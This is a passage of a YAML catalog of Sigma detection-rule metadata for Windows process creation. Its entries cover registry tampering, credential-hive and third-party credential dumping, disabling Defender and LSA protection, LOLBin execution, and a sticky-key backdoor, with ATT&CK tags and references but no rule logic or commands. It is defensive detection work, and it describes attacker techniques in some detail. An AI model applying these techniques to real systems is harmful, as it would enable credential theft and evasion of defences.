  name: RestrictedAdminMode Registry Value Tampering - ProcCreation
  description: 'Detects changes to the "DisableRestrictedAdmin" registry value in
    order to disable or enable RestrictedAdmin mode.

    RestrictedAdmin mode prevents the transmission of reusable credentials to the
    remote system to which you connect using Remote Desktop.

    This prevents your credentials from being harvested during the initial connection
    process if the remote server has been compromise

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md
  - https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8c0eca51-0f88-4db2-9183-fdfb10c703f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_lsa_ppl_protection_disabled.yml
  name: LSA PPL Protection Disabled Via Reg.EXE
  description: Detects the usage of the "reg.exe" utility to disable PPL protection
    on the LSA process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.010
  tags:
  - attack.defense-evasion
  - attack.t1562.010
  time_window: ''
  references:
  - https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f5240972-3938-4e56-8e4b-e33893176c1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_machineguid.yml
  name: Suspicious Query of MachineGUID
  description: Use of reg to get MachineGuid information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery
  false_positives:
  - Unknown
  notes: ''
- detection_id: ada4b0c4-758b-46ac-9033-9004613a150d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_modify_group_policy_settings.yml
  name: Modify Group Policy Settings
  description: Detect malicious GPO modifications can be used to implement many other
    malicious behaviors.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1484.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1484.001/T1484.001.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 98dedfdd-8333-49d4-9f23-d7018cccae53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_nolmhash.yml
  name: Enable LM Hash Storage - ProcCreation
  description: 'Detects changes to the "NoLMHash" registry value in order to allow
    Windows to store LM Hashes.

    By setting this registry value to "0" (DWORD), Windows will be allowed to store
    a LAN manager hash of your password in Active Directory and local SAM databases.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  - https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password
  - https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/
  false_positives:
  - Unknown
  notes: ''
- detection_id: dd3ee8cc-f751-41c9-ba53-5a32ed47e563
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_open_command.yml
  name: Suspicious Reg Add Open Command
  description: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry
    hives using DelegateExecute key
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://thedfirreport.com/2021/12/13/diavol-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 970007b7-ce32-49d0-a4a4-fbef016950bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_query_registry.yml
  name: Potential Configuration And Service Reconnaissance Via Reg.EXE
  description: Detects the usage of "reg.exe" in order to query reconnaissance information
    from the registry. Adversaries may interact with the Windows registry to gather
    information about credentials, the system, configuration, and installed software.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1007
  - T1012
  tags:
  - attack.discovery
  - attack.t1012
  - attack.t1007
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1012/T1012.md
  false_positives:
  - Discord
  notes: ''
- detection_id: 0d5675be-bc88-4172-86d3-1e96a4476536
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml
  name: Potential Tampering With RDP Related Registry Keys Via Reg.EXE
  description: Detects the execution of "reg.exe" for enabling/disabling the RDP service
    on the host by tampering with the 'CurrentControlSet\Control\Terminal Server'
    values
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1021.001
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1021.001
  - attack.t1112
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  - http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/
  - http://woshub.com/rds-shadow-how-to-connect-to-a-user-session-in-windows-server-2012-r2/
  - https://admx.help/HKLM/SOFTWARE/Policies/Microsoft/Windows%20NT/Terminal%20Services
  - https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/
  - https://blog.sekoia.io/darkgate-internals/
  - https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure/
  - https://github.com/redcanaryco/atomic-red-team/blob/02c7d02fe1f1feb0fc7944550408ea8224273994/atomics/T1112/T1112.md#atomic-test-63---disable-remote-desktop-anti-alias-setting-through-registry
  - https://github.com/redcanaryco/atomic-red-team/blob/02c7d02fe1f1feb0fc7944550408ea8224273994/atomics/T1112/T1112.md#atomic-test-64---disable-remote-desktop-security-settings-through-registry
  - https://github.com/redcanaryco/atomic-red-team/blob/dd526047b8c399c312fee47d1e6fb531164da54d/atomics/T1112/T1112.yaml#L790
  - https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-securitylayer
  - https://threathunterplaybook.com/hunts/windows/190407-RegModEnableRDPConnections/notebook.html
  - https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A&s=03
  - https://web.archive.org/web/20200929062532/https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html
  - https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0fc35fc3-efe6-4898-8a37-0b233339524f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_screensaver.yml
  name: Suspicious ScreenSave Change by Reg.exe
  description: 'Adversaries may establish persistence by executing malicious content
    triggered by user inactivity.

    Screensavers are programs that execute after a configurable time of user inactivity
    and consist of Portable Executable (PE) files with a .scr file extension

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.002
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.002/T1546.002.md
  - https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf
  false_positives:
  - GPO
  notes: ''
- detection_id: 9b0b7ac3-6223-47aa-a3fd-e8f211e637db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_service_imagepath_change.yml
  name: Changing Existing Service ImagePath Value Via Reg.EXE
  description: 'Adversaries may execute their own malicious payloads by hijacking
    the Registry entries used by services.

    Adversaries may use flaws in the permissions for registry to redirect from the
    originally specified executable to one that they control, in order to launch their
    own code at Service start.

    Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.011
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.011/T1574.011.md#atomic-test-2---service-imagepath-change-with-regexe
  false_positives:
  - Unknown
  notes: ''
- detection_id: e13f668e-7f95-443d-98d2-1816a7648a7b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_software_discovery.yml
  name: Detected Windows Software Discovery
  description: Adversaries may attempt to enumerate software for a variety of reasons,
    such as figuring out what security measures are present or if the compromised
    system has a version of software that is vulnerable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518
  tags:
  - attack.discovery
  - attack.t1518
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1518/T1518.md
  - https://github.com/harleyQu1nn/AggressorScripts
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml
  name: Reg Add Suspicious Paths
  description: Detects when an adversary uses the reg.exe utility to add or modify
    new keys or subkeys
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Rare legitimate add to registry via cli (to these locations)
  notes: ''
- detection_id: dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_volsnap_disable.yml
  name: Disabled Volume Snapshots
  description: Detects commands that temporarily turn off Volume Snapshots
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1354766164166115331
  false_positives:
  - Legitimate administration
  notes: ''
- detection_id: 452bce90-6fb0-43cc-97a5-affc283139b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_windows_defender_tamper.yml
  name: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE
  description: 'Detects the usage of "reg.exe" to tamper with different Windows Defender
    registry keys in order to disable some important features related to protection
    and detection

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/
  - https://github.com/swagkarna/Defeat-Defender-V1.2.0/tree/ae4059c4276da6f6303b8f53cdff085ecae88a91
  - https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2
  - https://tria.ge/241231-j9yatstqbm/behavioral1
  false_positives:
  - Rare legitimate use by administrators to test software (should always be investigated)
  notes: ''
- detection_id: 75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_write_protect_for_storage_disabled.yml
  name: Write Protect For Storage Disabled
  description: 'Detects applications trying to modify the registry in order to disable
    any write-protect property for storage devices.

    This could be a precursor to a ransomware attack and has been an observed technique
    used by cypherpunk group.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://www.manageengine.com/products/desktop-central/os-imaging-deployment/media-is-write-protected.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 651f87f7-12db-47f9-84c5-f27b081b94b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regasm_no_flag_or_dll_execution.yml
  name: RegAsm.EXE Execution Without CommandLine Flags or Files
  description: 'Detects the execution of "RegAsm.exe" without a commandline flag or
    file, which might indicate potential process injection activity.

    Usually "RegAsm.exe" should point to a dedicated DLL file or call the help with
    the "/?" flag.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.009
  tags:
  - attack.defense-evasion
  - attack.t1218.009
  time_window: ''
  references:
  - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/agent-teslas-unique-approach-vbs-and-steganography-for-delivery-and-intrusion/
  - https://www.zscaler.fr/blogs/security-research/threat-actors-exploit-cve-2017-11882-deliver-agent-tesla
  - https://learn.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool
  - https://app.any.run/tasks/ea944b89-69d8-49c8-ac1f-5c76ad300db2
  - https://www.joesandbox.com/analysis/1467354/0/html
  false_positives:
  - Legitimate use of Regasm by developers.
  notes: ''
- detection_id: e9f8f8cc-07cc-4e81-b724-f387db9175e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regasm_regsvcs_uncommon_extension_execution.yml
  name: Potentially Suspicious Execution Of Regasm/Regsvcs With Uncommon Extension
  description: Detects potentially suspicious execution of the Regasm/Regsvcs utilities
    with an uncommon extension.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.009
  tags:
  - attack.defense-evasion
  - attack.t1218.009
  time_window: ''
  references:
  - https://www.fortiguard.com/threat-signal-report/4718?s=09
  - https://lolbas-project.github.io/lolbas/Binaries/Regasm/
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: cc368ed0-2411-45dc-a222-510ace303cb2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regasm_regsvcs_uncommon_location_execution.yml
  name: Potentially Suspicious Execution Of Regasm/Regsvcs From Uncommon Location
  description: Detects potentially suspicious execution of the Regasm/Regsvcs utilities
    from a potentially suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.009
  tags:
  - attack.defense-evasion
  - attack.t1218.009
  time_window: ''
  references:
  - https://www.fortiguard.com/threat-signal-report/4718?s=09
  - https://lolbas-project.github.io/lolbas/Binaries/Regasm/
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 82880171-b475-4201-b811-e9c826cd5eaa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regedit_export_critical_keys.yml
  name: Exports Critical Registry Keys To a File
  description: Detects the export of a crital Registry key to a file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Exfiltration
  techniques:
  - T1012
  tags:
  - attack.exfiltration
  - attack.discovery
  - attack.t1012
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regedit/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Dumping hives for legitimate purpouse i.e. backup or forensic investigation
  notes: ''
- detection_id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regedit_export_keys.yml
  name: Exports Registry Key To a File
  description: Detects the export of the target Registry key to a file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Exfiltration
  techniques:
  - T1012
  tags:
  - attack.exfiltration
  - attack.discovery
  - attack.t1012
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regedit/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Legitimate export of keys
  notes: ''
- detection_id: 73bba97f-a82d-42ce-b315-9182e76c57b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml
  name: Imports Registry Key From a File
  description: Detects the import of the specified file to the registry with regedit.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.t1112
  - attack.defense-evasion
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regedit/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Legitimate import of keys
  - Evernote
  notes: ''
- detection_id: 0b80ade5-6997-4b1d-99a1-71701778ea61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml
  name: Imports Registry Key From an ADS
  description: Detects the import of a alternate datastream to the registry with regedit.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.t1112
  - attack.defense-evasion
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regedit/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Unknown
  notes: ''
- detection_id: 883835a7-df45-43e4-bf1d-4268768afda4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regedit_trustedinstaller.yml
  name: Regedit as Trusted Installer
  description: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://twitter.com/1kwpeter/status/1397816101455765504
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 77946e79-97f1-45a2-84b4-f37b5c0d8682
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regini_ads.yml
  name: Suspicious Registry Modification From ADS Via Regini.EXE
  description: Detects the import of an alternate data stream with regini.exe, regini.exe
    can be used to modify registry keys.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.t1112
  - attack.defense-evasion
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regini/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regini
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5f60740a-f57b-4e76-82a1-15b6ff2cb134
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_regini_execution.yml
  name: Registry Modification Via Regini.EXE
  description: Detects the execution of regini.exe which can be used to modify registry
    keys, the changes are imported from one or more text files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.t1112
  - attack.defense-evasion
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regini/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regini
  false_positives:
  - Legitimate modification of keys
  notes: ''
- detection_id: a2910908-e86f-4687-aeba-76a5f996e652
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_cimprovider_dll_load.yml
  name: DLL Execution Via Register-cimprovider.exe
  description: Detects using register-cimprovider.exe to execute arbitrary dll file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574
  time_window: ''
  references:
  - https://twitter.com/PhilipTsukerman/status/992021361106268161
  - https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 87a476dc-0079-4583-a985-dee7a20a03de
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_enumeration_for_credentials_cli.yml
  name: Enumeration for 3rd Party Creds From CLI
  description: Detects processes that query known 3rd party registry keys that holds
    credentials via commandline
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.002
  tags:
  - attack.credential-access
  - attack.t1552.002
  time_window: ''
  references:
  - https://isc.sans.edu/diary/More+Data+Exfiltration/25698
  - https://github.com/synacktiv/Radmin3-Password-Cracker/blob/acfc87393e4b7c06353973a14a6c7126a51f36ac/regkey.txt
  - https://github.com/HyperSine/how-does-MobaXterm-encrypt-password
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
  false_positives:
  - Unknown
  notes: ''
- detection_id: cc1abf27-78a3-4ac5-a51c-f3070b1d8e40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_export_of_thirdparty_creds.yml
  name: Registry Export of Third-Party Credentials
  description: 'Detects the use of reg.exe to export registry paths associated with
    third-party credentials.

    Credential stealers have been known to use this technique to extract sensitive
    information from the registry.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.002
  tags:
  - attack.credential-access
  - attack.t1552.002
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/fdc86a5b3d7df37a72c3272836f743747c47bfbc538f05af9ecf78547fa2e789/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 10344bb3-7f65-46c2-b915-2d00d47be5b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade.yml
  name: IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols Via CLI
  description: 'Detects changes to Internet Explorer''s (IE / Windows Internet properties)
    ZoneMap configuration of the "HTTP" and "HTTPS" protocols to point to the "My
    Computer" zone. This allows downloaded files from the Internet to be granted the
    same level of trust as files stored locally.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/M_haggis/status/1699056847154725107
  - https://twitter.com/JAMESWT_MHT/status/1699042827261391247
  - https://learn.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries
  - https://www.virustotal.com/gui/file/339ff720c74dc44265b917b6d3e3ba0411d61f3cd3c328e9a2bae81592c8a6e5/content
  false_positives:
  - Unknown
  notes: ''
- detection_id: ae215552-081e-44c7-805f-be16f975c8a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_registry_install_reg_debugger_backdoor.yml
  name: Suspicious Debugger Registration Cmdline
  description: Detects the registration of a debugger for a program that is available
    in the logon screen (sticky key backdoor).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.008
